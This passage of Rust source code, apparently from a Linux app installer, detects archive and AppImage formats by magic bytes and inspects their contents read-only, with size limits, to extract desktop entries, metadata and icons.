//! Magic-byte format detection and read-only archive / AppImage inspection.

use std::fs::File;
use std::io::{BufReader, Read, Seek, SeekFrom};
use std::path::Path;

use backhand::{FilesystemReader, InnerNode};
use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64;
use bzip2::read::BzDecoder;
use flate2::read::GzDecoder;
use serde::{Deserialize, Deserializer, Serialize, Serializer};
use tar::Archive;
use xz2::read::XzDecoder;
use zip::ZipArchive;

use crate::error::EasiError;
use crate::limits::LIMITS;
use crate::model::{Format, ScriptReport};

/// One row in the magic-byte format table.
struct MagicRule {
    offset: usize,
    bytes: &'static [u8],
    extra_offset: Option<(usize, &'static [u8])>,
    format: Format,
}

const FORMAT_RULES: &[MagicRule] = &[
    // AppImage Type 2: ELF magic at 0 + "AI\x02" at offset 8.
    MagicRule {
        offset: 0,
        bytes: b"\x7fELF",
        extra_offset: Some((8, b"AI\x02")),
        format: Format::AppImageType2,
    },
    // AppImage Type 1: ELF magic at 0 + "AI\x01" at offset 8.
    MagicRule {
        offset: 0,
        bytes: b"\x7fELF",
        extra_offset: Some((8, b"AI\x01")),
        format: Format::AppImageType1,
    },
    // gzip (.tar.gz)
    MagicRule {
        offset: 0,
        bytes: &[0x1f, 0x8b],
        extra_offset: None,
        format: Format::TarGz,
    },
    // xz (.tar.xz)
    MagicRule {
        offset: 0,
        bytes: &[0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00],
        extra_offset: None,
        format: Format::TarXz,
    },
    // zstd (.tar.zst)
    MagicRule {
        offset: 0,
        bytes: &[0x28, 0xb5, 0x2f, 0xfd],
        extra_offset: None,
        format: Format::TarZst,
    },
    // bzip2 (.tar.bz2)
    MagicRule {
        offset: 0,
        bytes: b"BZh",
        extra_offset: None,
        format: Format::TarBz2,
    },
    // lz4 frame (.tar.lz4)
    MagicRule {
        offset: 0,
        bytes: &[0x04, 0x22, 0x4d, 0x18],
        extra_offset: None,
        format: Format::TarLz4,
    },
    // zip (local header / empty / spanned)
    MagicRule {
        offset: 0,
        bytes: b"PK\x03\x04",
        extra_offset: None,
        format: Format::Zip,
    },
    MagicRule {
        offset: 0,
        bytes: b"PK\x05\x06",
        extra_offset: None,
        format: Format::Zip,
    },
    // 7z archive
    MagicRule {
        offset: 0,
        bytes: &[0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c],
        extra_offset: None,
        format: Format::SevenZ,
    },
    // uncompressed tar (POSIX ustar at offset 257)
    MagicRule {
        offset: 257,
        bytes: b"ustar",
        extra_offset: None,
        format: Format::Tar,
    },
];

/// Identify format purely from file header magic bytes.
pub fn detect_format(header: &[u8]) -> Option<Format> {
    for rule in FORMAT_RULES {
        let end = rule.offset + rule.bytes.len();
        if header.len() < end || &header[rule.offset..end] != rule.bytes {
            continue;
        }
        if let Some((eo, eb)) = rule.extra_offset {
            let eend = eo + eb.len();
            if header.len() < eend || &header[eo..eend] != eb {
                continue;
            }
        }
        return Some(rule.format);
    }
    None
}

pub fn detect_file_format(path: &Path) -> Result<Format, EasiError> {
    if !path.exists() {
        return Err(EasiError::NotFound(path.to_path_buf()));
    }
    let mut file = File::open(path)?;
    let mut header = [0u8; 512];
    let n = file.read(&mut header)?;
    if let Some(fmt) = detect_format(&header[..n]) {
        // Distinguish executable `.jar` (Java archive) from plain `.zip`.
        if fmt == Format::Zip
            && path
                .extension()
                .and_then(|e| e.to_str())
                .is_some_and(|e| e.eq_ignore_ascii_case("jar"))
        {
            return Ok(Format::Jar);
        }
        return Ok(fmt);
    }
    if n >= 4 && &header[..4] == b"\x7fELF" {
        // Older AppImage Type 1 binaries omit `AI\x01` at offset 8 but carry ISO9660 `CD001` at 0x8001.
        if file.seek(SeekFrom::Start(0x8001)).is_ok() {
            let mut iso = [0u8; 5];
            if file.read_exact(&mut iso).is_ok() && &iso == b"CD001" {
                return Ok(Format::AppImageType1);
            }
        }
        // Reject shared libraries (.so); accept standalone ELF executables.
        let fname = path
            .file_name()
            .map(|s| s.to_string_lossy().to_ascii_lowercase())
            .unwrap_or_default();
        if !fname.ends_with(".so") && !fname.contains(".so.") {
            return Ok(Format::BareElf);
        }
    }
    if n >= 2 && &header[..2] == b"#!" {
        let lower = path
            .file_name()
            .map(|s| s.to_string_lossy().to_ascii_lowercase())
            .unwrap_or_default();
        if lower.ends_with(".run") || lower.ends_with(".sh") || lower.ends_with(".bin") {
            return Ok(Format::ShellInstaller);
        }
    }
    if let Some(err) = detect_friendly_unsupported(path, &header[..n]) {
        return Err(err);
    }
    Err(EasiError::UnsupportedFormat(path.to_path_buf()))
}

/// Recognize Windows/macOS downloads and distro package formats to give helpful errors
/// instead of a generic "unsupported format".
pub fn detect_friendly_unsupported(path: &Path, header: &[u8]) -> Option<EasiError> {
    let fname = path
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default();
    let lower = fname.to_ascii_lowercase();

    // Windows PE (.exe / .dll) or MSI
    if (header.len() >= 2 && &header[..2] == b"MZ")
        || lower.ends_with(".exe")
        || lower.ends_with(".msi")
    {
        return Some(EasiError::WrongPlatform {
            platform: "Windows",
            hint: "Look for a Linux (.AppImage, .tar.gz, .tar.xz, or .zip) download instead — or run the Windows version with Wine / Bottles / Proton.",
        });
    }

    // macOS .dmg or Mach-O binary
    let is_macho = header.len() >= 4
        && matches!(
            &header[..4],
            [0xfe, 0xed, 0xfa, 0xce]
                | [0xce, 0xfa, 0xed, 0xfe]
                | [0xfe, 0xed, 0xfa, 0xcf]
                | [0xcf, 0xfa, 0xed, 0xfe]
        );
    if is_macho || lower.ends_with(".dmg") || lower.ends_with(".pkg") {
        return Some(EasiError::WrongPlatform {
            platform: "macOS",
            hint: "Look for a Linux (.AppImage, .tar.gz, .tar.xz, or .zip) download instead.",
        });
    }

    // Distro package formats (out of scope — redirect to the distro's own tool)
    if (header.len() >= 8 && &header[..8] == b"!<arch>\n" && lower.ends_with(".deb"))
        || lower.ends_with(".deb")
    {
        return Some(EasiError::DistroPackage {
            kind: "Debian/Ubuntu (.deb)",
            command: format!("sudo apt install ./{fname}"),
        });
    }
    if (header.len() >= 4 && &header[..4] == b"\xed\xab\xee\xdb") || lower.ends_with(".rpm") {
        return Some(EasiError::DistroPackage {
            kind: "Fedora/RHEL (.rpm)",
            command: format!("sudo dnf install ./{fname}"),
        });
    }
    if lower.ends_with(".flatpak") || lower.ends_with(".flatpakref") {
        return Some(EasiError::DistroPackage {
            kind: "Flatpak",
            command: format!("flatpak install {fname}"),
        });
    }
    if lower.ends_with(".snap") {
        return Some(EasiError::DistroPackage {
            kind: "Snap",
            command: format!("sudo snap install --dangerous {fname}"),
        });
    }
    None
}

/// Metadata collected for one entry during read-only inspection (no disk extraction).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ArchiveEntry {
    pub path: String,
    pub size: u64,
    pub mode: u32,
    pub is_dir: bool,
    pub is_symlink: bool,
    pub symlink_target: Option<String>,
    pub is_elf: bool,
    #[serde(deserialize_with = "deserialize_elf_arch")]
    pub elf_arch: ElfArch,
    pub is_script: bool,
}

/// ELF `e_machine` → Rust's `std::env::consts::ARCH` name.
const ARCH_TABLE: &[(u16, &str)] = &[
    (62, "x86_64"),
    (183, "aarch64"),
    (3, "x86"),
    (40, "arm"),
    (243, "riscv64"),
];

/// Named so serde's derive does not treat `Option<&str>` as implicitly borrowed from the input
/// (which would force `'de: 'static`); [`deserialize_elf_arch`] maps names back instead.
pub type ElfArch = Option<&'static str>;

/// Arch names cross the `__inspect` boundary as strings; map them back onto the table's
/// `'static` names (unknown names become `None`, as for an unknown `e_machine`).
fn deserialize_elf_arch<'de, D: Deserializer<'de>>(d: D) -> Result<ElfArch, D::Error> {
    let name = Option::<String>::deserialize(d)?;
    Ok(name.and_then(|n| ARCH_TABLE.iter().find(|(_, a)| *a == n).map(|(_, a)| *a)))
}

/// Map ELF `e_machine` (offset 18, little-endian u16) to Rust's `std::env::consts::ARCH` name.
pub fn elf_arch_from_header(header: &[u8]) -> Option<&'static str> {
    if header.len() < 20 || &header[0..4] != b"\x7fELF" {
        return None;
    }
    let machine = u16::from_le_bytes([header[18], header[19]]);
    ARCH_TABLE
        .iter()
        .find(|(m, _)| *m == machine)
        .map(|(_, name)| *name)
}

/// Small metadata files extracted in memory during inspection.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PackageContents {
    pub entries: Vec<ArchiveEntry>,
    pub desktop_files: Vec<(String, String)>,
    pub metainfo_files: Vec<(String, String)>,
    #[serde(
        serialize_with = "serialize_icons",
        deserialize_with = "deserialize_icons"
    )]
    pub embedded_icons: Vec<(String, Vec<u8>)>,
    pub has_appimage_sig_section: bool,
    pub appimage_sig_section: Option<(u64, u64, Vec<u8>)>,
    pub appimage_upd_info: Option<String>,
    pub meta_name: Option<String>,
    pub meta_version: Option<String>,
    pub jar_main_class: Option<String>,
    pub script_report: Option<ScriptReport>,
}

// Icons dominate the `__inspect` reply; base64 keeps it ~1.33x their size instead of the ~3.6x
// of a JSON number array, so a full inspection budget fits the reply cap.
fn serialize_icons<S: Serializer>(icons: &[(String, Vec<u8>)], s: S) -> Result<S::Ok, S::Error> {
    s.collect_seq(icons.iter().map(|(p, b)| (p, BASE64.encode(b))))
}

fn deserialize_icons<'de, D: Deserializer<'de>>(d: D) -> Result<Vec<(String, Vec<u8>)>, D::Error> {
    Vec::<(String, String)>::deserialize(d)?
        .into_iter()
        .map(|(p, b)| {
            BASE64
                .decode(b)
                .map(|bytes| (p, bytes))
                .map_err(serde::de::Error::custom)
        })
        .collect()
}

/// Read at most `cap` bytes without trusting header sizes; `None` when the content is longer.
pub(crate) fn read_capped<R: Read + ?Sized>(reader: &mut R, cap: u64) -> Option<Vec<u8>> {
    let mut buf = Vec::new();
    reader
        .take(cap.saturating_add(1))
        .read_to_end(&mut buf)
        .ok()?;
    (buf.len() as u64 <= cap).then_some(buf)
}

/// Read at most `max_entry` bytes without trusting archive header sizes, respecting `budget`.
fn read_bounded_bytes<R: Read + ?Sized>(
    reader: &mut R,
    max_entry: u64,
    budget: &mut usize,
) -> Option<Vec<u8>> {
    let cap = (max_entry as usize).min(*budget);
    if cap == 0 {
        return None;
    }
    let buf = read_capped(reader, cap as u64)?;
    *budget = budget.saturating_sub(buf.len());
    Some(buf)
}

fn is_desktop_path(path: &str) -> bool {
    path.ends_with(".desktop")
}

fn is_metainfo_path(path: &str) -> bool {
    (path.contains("metainfo/") || path.contains("appdata/")) && path.ends_with(".xml")
}

fn is_icon_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.ends_with(".png")
        || lower.ends_with(".svg")
        || lower.ends_with(".xpm")
        || lower == ".diricon"
        || lower.ends_with("/.diricon")
}

fn is_asar_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower == "app.asar" || lower.ends_with("/resources/app.asar") || lower == "resources/app.asar"
}

#[derive(Debug, Clone)]
struct AsarIconCandidate {
    path: String,
    offset: u64,
    size: u64,
    score: i32,
}

/// Parse an Electron ASAR header JSON tree and collect `.png`/`.svg` icon candidates (zero deps).
fn parse_asar_icon_candidates(json: &str) -> Vec<AsarIconCandidate> {
    let bytes = json.as_bytes();
    let mut pos = 0usize;
    let mut out = Vec::new();
    skip_ws(bytes, &mut pos);
    parse_asar_dir_object(bytes, &mut pos, "", &mut out);
    out.sort_by(|a, b| {
        b.score
            .cmp(&a.score)
            .then_with(|| b.size.cmp(&a.size))
            .then_with(|| a.path.cmp(&b.path))
    });
    out
}

fn score_asar_icon(path: &str, size: u64) -> i32 {
    let lower = path.to_ascii_lowercase();
    let mut score = 10i32;
    if lower == "icon.png"
        || lower == "icon.svg"
        || lower.ends_with("/icon.png")
        || lower.ends_with("/icon.svg")
    {
        score += 60;
    }
    if lower.ends_with(".svg") {
        score += 35;
    }
    if lower.contains("512x512") || lower.contains("256x256") {
        score += 30;
    }
    if lower.contains("logo") || lower.contains("appicon") {
        score += 20;
    }
    if lower.contains("tray") || lower.contains("template") || lower.contains("16x16") {
        score -= 40;
    }
    if lower.contains("node_modules/") || lower.contains("test/") {
        score -= 80;
    }
    if size >= 4096 {
        score += 15;
    }
    score
}

fn skip_ws(b: &[u8], pos: &mut usize) {
    while *pos < b.len() && matches!(b[*pos], b' ' | b'\t' | b'\r' | b'\n') {
        *pos += 1;
    }
}

fn parse_json_str(b: &[u8], pos: &mut usize) -> Option<String> {
    skip_ws(b, pos);
    if *pos >= b.len() || b[*pos] != b'"' {
        return None;
    }
    *pos += 1;
    let mut s = String::new();
    while *pos < b.len() {
        let ch = b[*pos];
        *pos += 1;
        if ch == b'"' {
            return Some(s);
        }
        if ch == b'\\' && *pos < b.len() {
            let esc = b[*pos];
            *pos += 1;
            match esc {
                b'"' => s.push('"'),
                b'\\' => s.push('\\'),
                b'/' => s.push('/'),
                b'n' => s.push('\n'),
                b'r' => s.push('\r'),
                b't' => s.push('\t'),
                b'u' if *pos + 4 <= b.len() => {
                    *pos += 4;
                }
                other => s.push(other as char),
            }
        } else {
            s.push(ch as char);
        }
    }
    None
}

fn skip_json_value(b: &[u8], pos: &mut usize) {
    skip_ws(b, pos);
    if *pos >= b.len() {
        return;
    }
    match b[*pos] {
        b'"' => {
            let _ = parse_json_str(b, pos);
        }
        b'{' => {
            *pos += 1;
            loop {
                skip_ws(b, pos);
                if *pos >= b.len() || b[*pos] == b'}' {
                    if *pos < b.len() {
                        *pos += 1;
                    }
                    break;
                }
                if parse_json_str(b, pos).is_none() {
                    break;
                }
                skip_ws(b, pos);
                if *pos < b.len() && b[*pos] == b':' {
                    *pos += 1;
                }
                skip_json_value(b, pos);
                skip_ws(b, pos);
                if *pos < b.len() && b[*pos] == b',' {
                    *pos += 1;
                }
            }
        }
        b'[' => {
            *pos += 1;
            loop {
                skip_ws(b, pos);
                if *pos >= b.len() || b[*pos] == b']' {
                    if *pos < b.len() {
                        *pos += 1;
                    }
                    break;
                }
                skip_json_value(b, pos);
                skip_ws(b, pos);
                if *pos < b.len() && b[*pos] == b',' {
                    *pos += 1;
                }
            }
        }
        _ => {
            while *pos < b.len()
                && !matches!(b[*pos], b',' | b'}' | b']' | b' ' | b'\t' | b'\r' | b'\n')
            {
                *pos += 1;
            }
        }
    }
}

fn parse_json_u64(b: &[u8], pos: &mut usize) -> Option<u64> {
    skip_ws(b, pos);
    if *pos >= b.len() {
        return None;
    }
    if b[*pos] == b'"' {
        return parse_json_str(b, pos)?.parse::<u64>().ok();
    }
    let start = *pos;
    while *pos < b.len() && b[*pos].is_ascii_digit() {
        *pos += 1;
    }
    std::str::from_utf8(&b[start..*pos])
        .ok()?
        .parse::<u64>()
        .ok()
}

fn parse_asar_dir_object(
    b: &[u8],
    pos: &mut usize,
    prefix: &str,
    out: &mut Vec<AsarIconCandidate>,
) {
    skip_ws(b, pos);
    if *pos >= b.len() || b[*pos] != b'{' {
        skip_json_value(b, pos);
        return;
    }
    *pos += 1;
    let mut size: Option<u64> = None;
    let mut offset: Option<u64> = None;
    let mut is_unpacked = false;
    loop {
        skip_ws(b, pos);
        if *pos >= b.len() || b[*pos] == b'}' {
            if *pos < b.len() {
                *pos += 1;
            }
            break;
        }
        let Some(key) = parse_json_str(b, pos) else {
            break;
        };
        skip_ws(b, pos);
        if *pos < b.len() && b[*pos] == b':' {
            *pos += 1;
        }
        skip_ws(b, pos);
        if key == "files" && *pos < b.len() && b[*pos] == b'{' {
            *pos += 1;
            loop {
                skip_ws(b, pos);
                if *pos >= b.len() || b[*pos] == b'}' {
                    if *pos < b.len() {
                        *pos += 1;
                    }
                    break;
                }
                let Some(entry_name) = parse_json_str(b, pos) else {
                    break;
                };
                skip_ws(b, pos);
                if *pos < b.len() && b[*pos] == b':' {
                    *pos += 1;
                }
                let child_path = if prefix.is_empty() {
                    entry_name.clone()
                } else {
                    format!("{prefix}/{entry_name}")
                };
                if child_path.starts_with("node_modules/") || child_path.contains("/node_modules/")
                {
                    skip_json_value(b, pos);
                } else {
                    parse_asar_dir_object(b, pos, &child_path, out);
                }
                skip_ws(b, pos);
                if *pos < b.len() && b[*pos] == b',' {
                    *pos += 1;
                }
            }
        } else if key == "size" {
            size = parse_json_u64(b, pos);
        } else if key == "offset" {
            offset = parse_json_u64(b, pos);
        } else if key == "unpacked" {
            let start = *pos;
            skip_json_value(b, pos);
            if &b[start..*pos] == b"true" {
                is_unpacked = true;
            }
        } else {
            skip_json_value(b, pos);
        }
        skip_ws(b, pos);
        if *pos < b.len() && b[*pos] == b',' {
            *pos += 1;
        }
    }

    if !is_unpacked
        && let (Some(sz), Some(off)) = (size, offset)
        && sz > 0
        && sz <= LIMITS.icon_bytes
        && !prefix.is_empty()
    {
        let lower = prefix.to_ascii_lowercase();
        if lower.ends_with(".png") || lower.ends_with(".svg") {
            let score = score_asar_icon(prefix, sz);
            out.push(AsarIconCandidate {
                path: prefix.to_string(),
                offset: off,
                size: sz,
                score,
            });
        }
    }
}

/// Extract the best `.png`/`.svg` app icon from an on-disk Electron `app.asar` file in O(1) seek.
pub fn extract_icon_from_asar_path(asar_path: &Path) -> Option<(String, Vec<u8>)> {
    let mut file = File::open(asar_path).ok()?;
    let mut hdr = [0u8; 16];
    file.read_exact(&mut hdr).ok()?;
    let hdr_obj_size = u32::from_le_bytes(hdr[4..8].try_into().ok()?) as u64;
    let json_len = u32::from_le_bytes(hdr[12..16].try_into().ok()?) as usize;
    if json_len == 0 || json_len > LIMITS.asar_header_bytes {
        return None;
    }
    let mut json_buf = vec![0u8; json_len];
    file.read_exact(&mut json_buf).ok()?;
    let json = std::str::from_utf8(&json_buf).ok()?;
    let data_base = 8u64.checked_add(hdr_obj_size)?;

    for cand in parse_asar_icon_candidates(json) {
        let abs_off = data_base.checked_add(cand.offset)?;
        if file.seek(SeekFrom::Start(abs_off)).is_err() {
            continue;
        }
        let mut buf = vec![0u8; cand.size as usize];
        if file.read_exact(&mut buf).is_ok()
            && (buf.starts_with(b"\x89PNG")
                || std::str::from_utf8(&buf[..buf.len().min(512)])
                    .is_ok_and(|s| s.contains("<svg")))
        {
            return Some((cand.path, buf));
        }
    }
    None
}

/// Extract the best `.png`/`.svg` app icon from a streaming Electron `app.asar` entry without
/// buffering the entire ASAR archive in RAM.
fn extract_icon_from_asar_stream<R: Read + ?Sized>(
    reader: &mut R,
    budget: &mut usize,
) -> Option<(String, Vec<u8>)> {
    let mut hdr = [0u8; 16];
    reader.read_exact(&mut hdr).ok()?;
    let hdr_obj_size = u32::from_le_bytes(hdr[4..8].try_into().ok()?) as u64;
    let json_len = u32::from_le_bytes(hdr[12..16].try_into().ok()?) as usize;
    if json_len == 0 || json_len > LIMITS.asar_header_bytes {
        return None;
    }
    let mut json_buf = vec![0u8; json_len];
    reader.read_exact(&mut json_buf).ok()?;
    let json = std::str::from_utf8(&json_buf).ok()?;
    let data_base = 8u64.checked_add(hdr_obj_size)?;
    let consumed = 16u64.checked_add(json_len as u64)?;
    if data_base < consumed {
        return None;
    }

    let best = parse_asar_icon_candidates(json).into_iter().next()?;
    let target_off = data_base.checked_add(best.offset)?;
    let skip = target_off.checked_sub(consumed)?;
    if best.size as usize > *budget {
        return None;
    }
    std::io::copy(&mut reader.take(skip), &mut std::io::sink()).ok()?;
    let mut buf = vec![0u8; best.size as usize];
    reader.read_exact(&mut buf).ok()?;
    if buf.starts_with(b"\x89PNG")
        || std::str::from_utf8(&buf[..buf.len().min(512)]).is_ok_and(|s| s.contains("<svg"))
    {
        *budget = budget.saturating_sub(buf.len());
        return Some((best.path, buf));
    }
    None
}

fn is_meta_hint_path(path: &str) -> bool {
    let base = Path::new(path)
        .file_name()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    let depth = path.trim_start_matches("./").matches('/').count();
    (base == "version" && depth <= 1)
        || (base == "application.ini" && depth <= 2)
        || (base == "package.json" && depth <= 3 && !path.contains("node_modules"))
        || path.eq_ignore_ascii_case("META-INF/MANIFEST.MF")
}

fn absorb_meta_hint(contents: &mut PackageContents, path: &str, text: &str) {
    let base = Path::new(path)
        .file_name()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    if path.eq_ignore_ascii_case("META-INF/MANIFEST.MF") {
        for line in text.lines() {
            if let Some(mc) = line.strip_prefix("Main-Class:") {
                let val = mc.trim();
                if !val.is_empty() {
                    contents.jar_main_class = Some(val.to_string());
                }
            }
        }
    } else if base == "version" {
        if contents.meta_version.is_none()
            && let Some(line) = text.lines().map(str::trim).find(|l| !l.is_empty())
            && line
                .chars()
                .next()
                .is_some_and(|c| c.is_ascii_digit() || c == 'v')
        {
            contents.meta_version = Some(line.trim_start_matches('v').to_string());
        }
    } else if base == "package.json" {
        if contents.meta_name.is_none() {
            contents.meta_name = crate::self_update::extract_json_string_field(text, "productName")
                .or_else(|| crate::self_update::extract_json_string_field(text, "name"));
        }
        if contents.meta_version.is_none() {
            contents.meta_version = crate::self_update::extract_json_string_field(text, "version");
        }
    } else if base == "application.ini" {
        for line in text.lines() {
            if contents.meta_name.is_none()
                && let Some(v) = line.trim().strip_prefix("Name=")
            {
                contents.meta_name = Some(v.trim().to_string());
            }
            if contents.meta_version.is_none()
                && let Some(v) = line.trim().strip_prefix("Version=")
            {
                contents.meta_version = Some(v.trim().to_string());
            }
        }
    }
}

/// Inspect archive, AppImage, bare ELF, JAR, or shell installer without extracting or executing.
pub fn inspect_contents(path: &Path, format: Format) -> Result<PackageContents, EasiError> {
    match format {
        Format::Tar => list_tar(BufReader::new(File::open(path)?)),
        Format::TarGz => {
            let file = File::open(path)?;
            list_tar(GzDecoder::new(BufReader::new(file)))
        }
        Format::TarXz => {
            let file = File::open(path)?;
            list_tar(XzDecoder::new(BufReader::new(file)))
        }
        Format::TarZst => {
            let file = File::open(path)?;
            let dec = zstd::stream::read::Decoder::new(BufReader::new(file))
                .map_err(|e| EasiError::Archive(e.to_string()))?;
            list_tar(dec)
        }
        Format::TarBz2 => {
            let file = File::open(path)?;
            list_tar(BzDecoder::new(BufReader::new(file)))
        }
        Format::TarLz4 => {
            let file = File::open(path)?;
            list_tar(lz4_flex::frame::FrameDecoder::new(BufReader::new(file)))
        }
        Format::Zip | Format::Jar => list_zip(path),
        Format::SevenZ => list_sevenz(path),
        Format::AppImageType2 => list_appimage_type2(path),
        Format::AppImageType1 | Format::BareElf => list_single_executable(path),
        Format::ShellInstaller => inspect_shell_installer(path),
    }
}

fn list_tar<R: Read>(reader: R) -> Result<PackageContents, EasiError> {
    let mut archive = Archive::new(reader);
    let mut contents = PackageContents::default();
    let mut inspect_budget = LIMITS.inspect_total_bytes;
    let entries = archive
        .entries()
        .map_err(|e| EasiError::Archive(e.to_string()))?;

    for item in entries {
        if contents.entries.len() >= LIMITS.archive_entries {
            return Err(EasiError::Archive(format!(
                "archive exceeds maximum entry limit ({})",
                LIMITS.archive_entries
            )));
        }
        let mut entry = item.map_err(|e| EasiError::Archive(e.to_string()))?;
        let raw_path = entry
            .path()
            .map_err(|e| EasiError::Archive(e.to_string()))?
            .to_string_lossy()
            .into_owned();
        let header = entry.header();
        let size = header.size().unwrap_or(0);
        let mode = header.mode().unwrap_or(0);
        let entry_type = header.entry_type();
        let is_dir = entry_type.is_dir();
        let is_symlink = entry_type.is_symlink() || entry_type.is_hard_link();
        let symlink_target = entry
            .link_name()
            .ok()
            .flatten()
            .map(|p| p.to_string_lossy().into_owned());

        let mut is_elf = false;
        let mut elf_arch = None;
        let mut is_script = false;

        if !is_dir && !is_symlink && size > 0 {
            if (is_desktop_path(&raw_path) || is_metainfo_path(&raw_path))
                && size <= LIMITS.metadata_bytes
            {
                if let Some(bytes) =
                    read_bounded_bytes(&mut entry, LIMITS.metadata_bytes, &mut inspect_budget)
                    && let Ok(text) = String::from_utf8(bytes)
                {
                    if is_desktop_path(&raw_path) {
                        contents.desktop_files.push((raw_path.clone(), text));
                    } else {
                        contents.metainfo_files.push((raw_path.clone(), text));
                    }
                }
            } else if is_meta_hint_path(&raw_path) && size <= LIMITS.metadata_bytes {
                if let Some(bytes) =
                    read_bounded_bytes(&mut entry, LIMITS.metadata_bytes, &mut inspect_budget)
                    && let Ok(text) = String::from_utf8(bytes)
                {
                    absorb_meta_hint(&mut contents, &raw_path, &text);
                }
            } else if is_icon_path(&raw_path) && size <= LIMITS.icon_bytes {
                if let Some(buf) =
                    read_bounded_bytes(&mut entry, LIMITS.icon_bytes, &mut inspect_budget)
                {
                    contents.embedded_icons.push((raw_path.clone(), buf));
                }
            } else if is_asar_path(&raw_path) {
                if let Some((icon_rel, buf)) =
                    extract_icon_from_asar_stream(&mut entry, &mut inspect_budget)
                {
                    let virtual_path = format!("asar://{icon_rel}");
                    contents.entries.push(ArchiveEntry {
                        path: virtual_path.clone(),
                        size: buf.len() as u64,
                        mode: 0o644,
                        is_dir: false,
                        is_symlink: false,
                        symlink_target: None,
                        is_elf: false,
                        elf_arch: None,
                        is_script: false,
                    });
                    contents.embedded_icons.push((virtual_path, buf));
                }
            } else {
                let mut magic = [0u8; 20];
                let n = entry.read(&mut magic).unwrap_or(0);
                is_elf = n >= 4 && &magic[..4] == b"\x7fELF";
                elf_arch = elf_arch_from_header(&magic[..n]);
                is_script = n >= 2 && &magic[..2] == b"#!";
            }
        }

        contents.entries.push(ArchiveEntry {
            path: raw_path,
            size,
            mode,
            is_dir,
            is_symlink,
            symlink_target,
            is_elf,
            elf_arch,
            is_script,
        });
    }
    Ok(contents)
}

fn list_zip(path: &Path) -> Result<PackageContents, EasiError> {
    let file = File::open(path)?;
    let mut zip =
        ZipArchive::new(BufReader::new(file)).map_err(|e| EasiError::Archive(e.to_string()))?;
    if zip.len() > LIMITS.archive_entries {
        return Err(EasiError::Archive(format!(
            "archive exceeds maximum entry limit ({})",
            LIMITS.archive_entries
        )));
    }
    let mut contents = PackageContents::default();
    let mut inspect_budget = LIMITS.inspect_total_bytes;

    for i in 0..zip.len() {
        let mut entry = zip
            .by_index(i)
            .map_err(|e| EasiError::Archive(e.to_string()))?;
        let raw_path = entry.name().to_string();
        let size = entry.size();
        let mode = entry.unix_mode().unwrap_or(0o644);
        let is_dir = entry.is_dir();
        let is_symlink = (mode & 0o170000) == 0o120000;
        let mut symlink_target = None;
        let mut is_elf = false;
        let mut elf_arch = None;
        let mut is_script = false;

        if is_symlink && size <= 4096 {
            if let Some(bytes) = read_bounded_bytes(&mut entry, 4096, &mut inspect_budget)
                && let Ok(target) = String::from_utf8(bytes)
            {
                symlink_target = Some(target);
            }
        } else if !is_dir && size > 0 {
            if (is_desktop_path(&raw_path) || is_metainfo_path(&raw_path))
                && size <= LIMITS.metadata_bytes
            {
                if let Some(bytes) =
                    read_bounded_bytes(&mut entry, LIMITS.metadata_bytes, &mut inspect_budget)
                    && let Ok(text) = String::from_utf8(bytes)
                {
                    if is_desktop_path(&raw_path) {
                        contents.desktop_files.push((raw_path.clone(), text));
                    } else {
                        contents.metainfo_files.push((raw_path.clone(), text));
                    }
                }
            } else if is_meta_hint_path(&raw_path) && size <= LIMITS.metadata_bytes {
                if let Some(bytes) =
                    read_bounded_bytes(&mut entry, LIMITS.metadata_bytes, &mut inspect_budget)
                    && let Ok(text) = String::from_utf8(bytes)
                {
                    absorb_meta_hint(&mut contents, &raw_path, &text);
                }
            } else if is_icon_path(&raw_path) && size <= LIMITS.icon_bytes {
                if let Some(buf) =
                    read_bounded_bytes(&mut entry, LIMITS.icon_bytes, &mut inspect_budget)
                {
                    contents.embedded_icons.push((raw_path.clone(), buf));
                }
            } else if is_asar_path(&raw_path) {
                if let Some((icon_rel, buf)) =
                    extract_icon_from_asar_stream(&mut entry, &mut inspect_budget)
                {
                    let virtual_path = format!("asar://{icon_rel}");
                    contents.entries.push(ArchiveEntry {
                        path: virtual_path.clone(),
                        size: buf.len() as u64,
                        mode: 0o644,
                        is_dir: false,
                        is_symlink: false,
                        symlink_target: None,
                        is_elf: false,
                        elf_arch: None,
                        is_script: false,
                    });
                    contents.embedded_icons.push((virtual_path, buf));
                }
            } else {
                let mut magic = [0u8; 20];
                let n = entry.read(&mut magic).unwrap_or(0);
                is_elf = n >= 4 && &magic[..4] == b"\x7fELF";
                elf_arch = elf_arch_from_header(&magic[..n]);
                is_script = n >= 2 && &magic[..2] == b"#!";
            }
        }

        contents.entries.push(ArchiveEntry {
            path: raw_path,
            size,
            mode,
            is_dir,
            is_symlink,
            symlink_target,
            is_elf,
            elf_arch,
            is_script,
        });
    }
    Ok(contents)
}

/// Find the SquashFS offset in an AppImage Type 2 binary using the ELF64 header
/// (e_shoff + e_shentsize * e_shnum), falling back to scanning for SquashFS magic `hsqs`.
pub fn find_appimage_squashfs_offset(file: &mut File) -> Result<(u64, bool), EasiError> {
    file.seek(SeekFrom::Start(0))?;
    let mut hdr = [0u8; 64];
    file.read_exact(&mut hdr)?;
    let has_sig_section = check_elf_section_name(file, &hdr, b".sha256_sig").unwrap_or(false);

    // ELF64 little-endian: e_shoff @ 40 (8 bytes), e_shentsize @ 58 (2), e_shnum @ 60 (2).
    if &hdr[0..4] == b"\x7fELF" && hdr[4] == 2 && hdr[5] == 1 {
        let shoff = u64::from_le_bytes(hdr[40..48].try_into().unwrap_or([0; 8]));
        let shentsize = u16::from_le_bytes(hdr[58..60].try_into().unwrap_or([0; 2])) as u64;
        let shnum = u16::from_le_bytes(hdr[60..62].try_into().unwrap_or([0; 2])) as u64;
        let offset = shoff.saturating_add(shentsize.saturating_mul(shnum));
        if offset > 0 && is_squashfs_at(file, offset)? {
            return Ok((offset, has_sig_section));
        }
    }

    // Fallback: scan up to first 2 MiB for SquashFS little-endian magic "hsqs".
    file.seek(SeekFrom::Start(0))?;
    let mut buf = vec![0u8; 2 * 1024 * 1024];
